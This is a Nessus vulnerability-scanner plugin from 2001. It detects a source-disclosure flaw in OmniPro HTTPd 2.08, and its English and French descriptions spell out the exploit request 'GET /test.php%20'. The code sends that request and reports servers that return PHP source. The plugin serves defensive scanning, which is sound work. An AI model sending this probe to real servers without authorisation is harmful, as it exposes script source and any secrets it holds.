#
# This script was written by Gregory Duchemin <plugin@intranode.com>
#
# See the Nessus Scripts License for details
#


#### REGISTER SECTION ####

if(description)
{


script_id(10716);
script_bugtraq_id(2788);
 script_version ("$Revision: 1.19 $");

#Name used in the client window.

name["english"] = "OmniPro HTTPd 2.08 scripts source full disclosure";
name["francais"] = "OmniPro httpd 2.08 révèle le source des scripts.";
script_name(english:name["english"], francais:name["francais"]);


#Description appearing in the Nessus client window when clicking on the name.

desc["english"]="
OmniPro HTTPd 2.08 suffers from a security vulnerability that permits 
malicious users to get the full source code of scripting files.

By appending an ASCII/Unicode space char '%20' at the script suffix, 
the web server will no longer interpret it and rather send it back clearly 
as a simple document to the user in the same manner as it usually does to 
process HTML-like files.

The flaw does not work with files located in CGI directories (e.g cgibin, 
cgi-win)

Exploit: GET /test.php%20 HTTP/1.0

Vulnerable systems: up to release 2.08

Solution: The vendor is aware of the problem but so far, no
patch has been made available. Contact your web server vendor 
for a possible solution. Until a complete fix is available, you 
should remove all scripting files from non-executable directories.

Risk factor : Medium";

desc["francais"]="
OmniPro httpd 2.08 contient une faille de sécurité permettent à un utilisateur 
malicieux de télécharger le source des scripts au lieu de visualiser le résultat de leur interprétation.
En ajoutant un caractère ascii/unicode d'espacement apres le suffixe du nom de 
fichier, le serveur considère qu'il s'agit d'un document standard à diffuser 
immédiatement.

Exploit: GET /test.php%20 HTTP/1.0


Version vulnérable: jusqu'à la version 2.08


Version saine: inconnue


Facteur de risque: Des informations sensibles peuvent se trouver dans le source de 
scripts et ainsi faire varier la gravité de la faille.


Solution:
Le vendeur est au courant du problème mais à ce jour aucun patch n'a été 
rendu public, il est donc conseillé de retirer tous les fichiers scripts des 
répertoires non exécutables.";
script_description(english:desc["english"], francais:desc["francais"]);




#Summary appearing in the tooltips, only one line. 

summary["english"]="Check the presence of OmniPro HTTPd 2.08 scripts source disclosure.";
summary["francais"]="Vérifie la présence de la faille du server OmniPro httpd 2.08.";	
script_summary(english:summary["english"], francais:summary["francais"]);


#Test among the firsts scripts, no risk to harm the remote host.

script_category(ACT_GATHER_INFO);



#CVE Index number

#script_cve_id("");



#Copyright stuff

script_copyright(english:"INTRANODE - 2001");

#Category in wich attack must be stored.

family["english"]="CGI abuses";
family["francais"]="Abus de CGI";
script_family(english:family["english"], francais:family["francais"]);


#Portscan the target and get back.

script_dependencie("find_service.nes", "http_version.nasl");


#optimization, 
#Check the presence of at least one listening web server.

script_require_ports(80, "Services/www");
 
exit(0);
}


include("http_func.inc");


#### ATTACK CODE SECTION ####

#Mandatory

function check_header(probe, port)
{ 
soc = http_open_socket(port);
if(!soc) return(0); 

 request = http_get(item:probe, port:port); 
 send(socket:soc, data:request);
 response = http_recv(socket:soc);
 http_close_socket(soc); 

 regex_signature[0] = "^Server: OmniHTTPd.*$";

if (egrep(pattern:regex_signature[0], string:response)) return(1);
else return(0);

}



function check(poison, port)
{ 
soc = http_open_socket(port);
if(!soc) return(0); 

 request = http_get(item:poison, port:port); 
 send(socket:soc, data:request);
 response = http_recv(socket:soc);
 http_close_socket(soc); 

 regex_signature[2] = "<?"; 


# here, a php signature.

if (regex_signature[2] >< response) return(1);
else return(0);

}




#search web port in knowledge database
#default is port 80

port = get_http_port(default:80);


if(!get_port_state(port)) exit(0);

if ( ! get_port_state(port) ) exit(0);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "OmniHTTPd" >!< sig ) exit(0);


Egg = "%20 ";
signature = "test.php";

probe=string("/");
if (!check_header(probe:probe, port:port)) exit(0);


poison=string("/", signature, Egg);

if (check(poison:poison, port:port))
{
report="OmniPro HTTPd web server is online and contains a security 
vulnerability that allows anybody to see PHP, SSI and SHTML scripts sources.
Nessus was able to get a complete PHP source from your server.
OmniPro servers are vulnerable up to version 2.08, please check the official website 
for the lastest release/patch : http://www.omnicron.com
If no patches are made available, you should, at least, remove all your scripts 
from non executable directories.

Solution : none yet
Risk factor : Medium";
security_warning(port:port, data:report);
}
else
{
report="
OmniPro HTTPd web server is online but Nessus could not detect its release number.
Because there is a serious security vulnerability permitting a full disclosure 
of PHP/SHTML/Perl scripts in 2.08 versions, we recommend you to quicly check the version you are
currently running and if vulnerable, to look at the official Omnicron website: http://www.omnicron.com ";
security_warning(port:port, data:report);
}

